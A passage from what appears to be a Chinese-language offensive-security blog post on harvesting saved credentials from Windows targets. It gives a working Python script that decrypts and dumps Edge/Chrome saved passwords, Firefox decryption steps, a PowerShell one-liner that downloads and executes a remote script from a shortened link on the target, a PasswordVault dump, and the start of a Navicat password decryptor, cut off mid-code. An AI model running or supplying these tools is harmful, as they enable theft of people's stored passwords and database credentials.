class="keyword">def</span> <span class="title function_">show_password</span>(<span class="params">self,db_file</span>):</span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">&#x27;select signon_realm,username_value,password_value from logins&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            <span class="comment"># print(type(row[2]))</span></span><br><span class="line">            host = row[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> host.startswith(<span class="string">&#x27;android&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            name = row[<span class="number">1</span>]</span><br><span class="line">            value = self.chrome_decrypt(row[<span class="number">2</span>])<span class="comment">######加密方式改變后的重點位置</span></span><br><span class="line">            <span class="comment">#密码解析后得到字节码，需要进行解码操作</span></span><br><span class="line">            _info = <span class="string">&#x27;url:%-40s username:%-20s password:%s\n&#x27;</span> %(host,name,value)</span><br><span class="line">            self.passwordList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">chrome_decrypt</span>(<span class="params">self,encrypted_txt</span>):</span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&#x27;win32&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> encrypted_txt[:<span class="number">4</span>] == <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span>:</span><br><span class="line">                    decrypted_txt = dpapi_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt.decode()</span><br><span class="line">                <span class="keyword">elif</span> encrypted_txt[:<span class="number">3</span>] == <span class="string">b&#x27;v10&#x27;</span>:</span><br><span class="line">                    decrypted_txt = aes_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt[:-<span class="number">16</span>].decode()</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unix_decrypt(encrypted_txt)</span><br><span class="line">            <span class="keyword">except</span> NotImplementedError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_passwords</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(self.passwordList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br></pre></td></tr></table></figure><h3 id="Firefox浏览器数据"><a href="#Firefox浏览器数据" class="headerlink" title="Firefox浏览器数据"></a>Firefox浏览器数据</h3><p>所有的密码保存位置在<code>%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\</code>(xxxxxxxx为8位随机字母和数字的组合)</p><p>不同版本的Firefox保存记录的文件名称不同，具体区别如下：</p><ul><li><p>Version大于等于32.0，保存记录的文件为logins.json</p></li><li><p>Version大于等于3.5，小于32.0，保存记录的文件为signons.sqlite</p></li></ul><p>不同版本的Firefox密钥文件的位置不同，具体区别如下：</p><ul><li><p>Version小于58.0.2，密钥文件为key3.db</p></li><li><p>Version大于等于58.0.2，密钥文件为key4.db</p></li></ul><p>默认情况下，当前用户的权限可以查看Firefox浏览器中保存的所有密码，为了提高安全性，Firefox浏览器支持为保存的密码添加额外的保护：设置Master Password。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/11.png" alt="image-20210609191949114"></p><p>添加Master Password后，查看保存的密码需要额外输入Master Password。</p><p>解密流程：</p><ul><li><p>读取密钥文件(key4.db或key3.db)，获得key和iv</p></li><li><p>读取记录文件(logins.json或signons.sqlite)的内容</p></li><li><p>如果未设置Master Password，使用key和iv对记录文件中的加密内容进行3DES-CBC解密。如果设置Master Password，还需要获得明文形式的Master Password，才能进行解密</p></li></ul><blockquote><p>未设置Master Password解密</p></blockquote><p>WebBrowserPassView：<a href="https://www.nirsoft.net/password_recovery_tools.html">官方下载</a> <a href="https://github.com/Ascotbe/Image/blob/master/WindowsGrabPassword/WebBrowserPassView.exe">备份下载</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\WebBrowserPassView.exe /LoadPasswordsFirefox 1 /shtml &quot;C:\Users\ascotbe\Desktop\passwords.html&quot;</span><br></pre></td></tr></table></figure><p>还能把谷歌最新版本的秘钥给解密了</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/12.png" alt="image-20210609192420620"></p><blockquote><p>设置Master Password解密</p></blockquote><p>firefox_decrypt：<a href="https://github.com/unode/firefox_decrypt/releases/tag/0.7.0">官方下载</a></p><p>解密需要获取到用户设置的Master Password才行，解密工具别使用1.0版本，问题很多</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/13.png" alt="image-20210609194828114"></p><h3 id="IE-浏览器数据"><a href="#IE-浏览器数据" class="headerlink" title="IE 浏览器数据"></a>IE 浏览器数据</h3><p>首先需要打开浏览器的记住密码功能：工具-&gt;Internet 选项-&gt;内容-&gt;自动完成-&gt;勾选表单上的用户名和密码</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/14.png" alt="image-20210610095248052"></p><blockquote><p>远程下载执行（需要开启PS可执行）</p></blockquote><p>直接使用命令，目前GitHub国内无法访问，推荐使用自己服务器存放脚本或者使用第三方源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://bit.ly/2K75g15&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/15.png" alt="image-20210610100850268"></p><blockquote><p>本地执行（需要开启PS可执行）</p></blockquote><p>直接把PS1文件放到目标机器上，执行就好了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">void</span>][<span class="type">Windows.Security.Credentials.PasswordVault</span>,<span class="type">Windows.Security.Credentials</span>,<span class="type">ContentType</span>=<span class="type">WindowsRuntime</span>]</span><br><span class="line"><span class="variable">$vault</span> = <span class="built_in">New-Object</span> Windows.Security.Credentials.PasswordVault</span><br><span class="line"><span class="variable">$vault</span>.RetrieveAll() | % &#123; <span class="variable">$_</span>.RetrievePassword();<span class="variable">$_</span> &#125; | <span class="built_in">select</span> username,resource,password</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/16.png" alt="image-20210610101513741"></p><blockquote><p>落地文件执行</p></blockquote><p>IE PassView：<a href="https://www.nirsoft.net/utils/internet_explorer_password.html">官方下载</a>  <a href="https://github.com/Ascotbe/Image/blob/master/WindowsGrabPassword/ViewPass.exe">备份下载</a></p><p>直接把文件双击即可看到密码</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/17.png" alt="image-20210610105509664"></p><h3 id="Edge浏览器数据"><a href="#Edge浏览器数据" class="headerlink" title="Edge浏览器数据"></a>Edge浏览器数据</h3><p>由于微软就套了一层壳，加密方式完全没有修改，值修改了数据保存的路径，所以我们修改上面Chrome的脚本即可获取成功</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#数据库路径</span><br><span class="line">C:\Users\ascotbe\AppData\Local\Microsoft\Edge\User Data\Default\Login Data</span><br><span class="line">#秘钥路径</span><br><span class="line">C:\Users\ascotbe\AppData\Local\Microsoft\Edge\User Data\Local State</span><br></pre></td></tr></table></figure><p>脚本修改如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span>  shutil</span><br><span class="line"><span class="keyword">import</span>  sqlite3</span><br><span class="line"><span class="keyword">import</span>  win32crypt</span><br><span class="line"><span class="keyword">import</span> json,base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> (</span><br><span class="line">    Cipher, algorithms, modes</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH= os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">DB_PATH = <span class="string">r&#x27;Microsoft\Edge\User Data\Default\Login Data&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NONCE_BYTE_SIZE = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">cipher, plaintext, nonce</span>):</span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ciphertext = encryptor.update(plaintext)</span><br><span class="line">    <span class="keyword">return</span> (cipher, ciphertext, nonce)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher, ciphertext, nonce</span>):</span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    <span class="keyword">return</span> decryptor.update(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cipher</span>(<span class="params">key</span>):</span><br><span class="line">    cipher = Cipher(</span><br><span class="line">        algorithms.AES(key),</span><br><span class="line">        <span class="literal">None</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dpapi_decrypt</span>(<span class="params">encrypted</span>):</span><br><span class="line">    <span class="keyword">import</span> ctypes</span><br><span class="line">    <span class="keyword">import</span> ctypes.wintypes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">DATA_BLOB</span>(ctypes.Structure):</span><br><span class="line">        _fields_ = [(<span class="string">&#x27;cbData&#x27;</span>, ctypes.wintypes.DWORD),</span><br><span class="line">                    (<span class="string">&#x27;pbData&#x27;</span>, ctypes.POINTER(ctypes.c_char))]</span><br><span class="line"></span><br><span class="line">    p = ctypes.create_string_buffer(encrypted, <span class="built_in">len</span>(encrypted))</span><br><span class="line">    blobin = DATA_BLOB(ctypes.sizeof(p), p)</span><br><span class="line">    blobout = DATA_BLOB()</span><br><span class="line">    retval = ctypes.windll.crypt32.CryptUnprotectData(</span><br><span class="line">        ctypes.byref(blobin), <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span>, ctypes.byref(blobout))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> retval:</span><br><span class="line">        <span class="keyword">raise</span> ctypes.WinError()</span><br><span class="line">    result = ctypes.string_at(blobout.pbData, blobout.cbData)</span><br><span class="line">    ctypes.windll.kernel32.LocalFree(blobout.pbData)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unix_decrypt</span>(<span class="params">encrypted</span>):</span><br><span class="line">    <span class="keyword">if</span> sys.platform.startswith(<span class="string">&#x27;linux&#x27;</span>):</span><br><span class="line">        password = <span class="string">&#x27;peanuts&#x27;</span></span><br><span class="line">        iterations = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">    salt = <span class="string">&#x27;saltysalt&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    length = <span class="number">16</span></span><br><span class="line">    key = PBKDF2(password, salt, length, iterations)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, IV=iv)</span><br><span class="line">    decrypted = cipher.decrypt(encrypted[<span class="number">3</span>:])</span><br><span class="line">    <span class="keyword">return</span> decrypted[:-<span class="built_in">ord</span>(decrypted[-<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key_from_local_state</span>():</span><br><span class="line">    jsn = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>],</span><br><span class="line">        <span class="string">r&quot;Microsoft\Edge\User Data\Local State&quot;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>,mode =<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jsn = json.loads(<span class="built_in">str</span>(f.readline()))</span><br><span class="line">    <span class="keyword">return</span> jsn[<span class="string">&quot;os_crypt&quot;</span>][<span class="string">&quot;encrypted_key&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">encrypted_txt</span>):</span><br><span class="line">    encoded_key = get_key_from_local_state()</span><br><span class="line">    encrypted_key = base64.b64decode(encoded_key.encode())</span><br><span class="line">    encrypted_key = encrypted_key[<span class="number">5</span>:]</span><br><span class="line">    key = dpapi_decrypt(encrypted_key)</span><br><span class="line">    nonce = encrypted_txt[<span class="number">3</span>:<span class="number">15</span>]</span><br><span class="line">    cipher = get_cipher(key)</span><br><span class="line">    <span class="keyword">return</span> decrypt(cipher,encrypted_txt[<span class="number">15</span>:],nonce)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChromePassword</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.passwordList = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_chrome_db</span>(<span class="params">self</span>):</span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)</span><br><span class="line">        _temp_path = os.path.join(APP_DATA_PATH,<span class="string">&#x27;sqlite_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_temp_path):</span><br><span class="line">            os.remove(_temp_path)</span><br><span class="line">        shutil.copyfile(_full_path,_temp_path)</span><br><span class="line">        self.show_password(_temp_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_password</span>(<span class="params">self,db_file</span>):</span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">&#x27;select signon_realm,username_value,password_value from logins&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            <span class="comment"># print(type(row[2]))</span></span><br><span class="line">            host = row[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> host.startswith(<span class="string">&#x27;android&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            name = row[<span class="number">1</span>]</span><br><span class="line">            value = self.chrome_decrypt(row[<span class="number">2</span>])<span class="comment">######加密方式改變后的重點位置</span></span><br><span class="line">            <span class="comment">#密码解析后得到字节码，需要进行解码操作</span></span><br><span class="line">            _info = <span class="string">&#x27;url:%-40s username:%-20s password:%s\n&#x27;</span> %(host,name,value)</span><br><span class="line">            self.passwordList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">chrome_decrypt</span>(<span class="params">self,encrypted_txt</span>):</span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&#x27;win32&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> encrypted_txt[:<span class="number">4</span>] == <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span>:</span><br><span class="line">                    decrypted_txt = dpapi_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt.decode()</span><br><span class="line">                <span class="keyword">elif</span> encrypted_txt[:<span class="number">3</span>] == <span class="string">b&#x27;v10&#x27;</span>:</span><br><span class="line">                    decrypted_txt = aes_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt[:-<span class="number">16</span>].decode()</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unix_decrypt(encrypted_txt)</span><br><span class="line">            <span class="keyword">except</span> NotImplementedError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_passwords</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(self.passwordList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br></pre></td></tr></table></figure><h2 id="数据库密码"><a href="#数据库密码" class="headerlink" title="数据库密码"></a>数据库密码</h2><h3 id="Navicat密码"><a href="#Navicat密码" class="headerlink" title="Navicat密码"></a>Navicat密码</h3><p>目前测试只能解密11和12两个版本，其他版本未测试</p><table><thead><tr><th align="left">数据库类型</th><th align="center">注册表路径</th></tr></thead><tbody><tr><td align="left">MySQL</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers</td></tr><tr><td align="left">MariaDB</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers</td></tr><tr><td align="left">MongoDB</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers</td></tr><tr><td align="left">Microsoft SQL</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers</td></tr><tr><td align="left">Oracle</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers</td></tr><tr><td align="left">PostgreSQL</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers</td></tr><tr><td align="left">SQLite</td><td align="center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers</td></tr></tbody></table><h4 id="能RDP连接到机器"><a href="#能RDP连接到机器" class="headerlink" title="能RDP连接到机器"></a>能RDP连接到机器</h4><p>当前已Mysql作为测试样例，通过注册列表中查看，位置如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers\</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/18.png" alt="image-20210610163933891"></p><p>接着把加密的密码复制出来进行解密，脚本如下，如果本机没有PHP环境可以使用<a href="https://tool.lu/coderunner/">在线网站</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">FatSmallTools</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NavicatPassword</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$version</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aesKey</span> = <span class="string">&#x27;libcckeylibcckey&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aesIv</span> = <span class="string">&#x27;libcciv libcciv &#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowString</span> = <span class="string">&#x27;3DC5CA39&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowKey</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowIv</span> = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$version</span> = <span class="number">12</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;version = <span class="variable">$version</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blowKey = <span class="title function_ invoke__">sha1</span>(<span class="string">&#x27;3DC5CA39&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blowIv = <span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;d9c7c3c8870d64bd&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;version) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encryptEleven</span>(<span class="variable">$string</span>);</span><br><span class="line">                <span 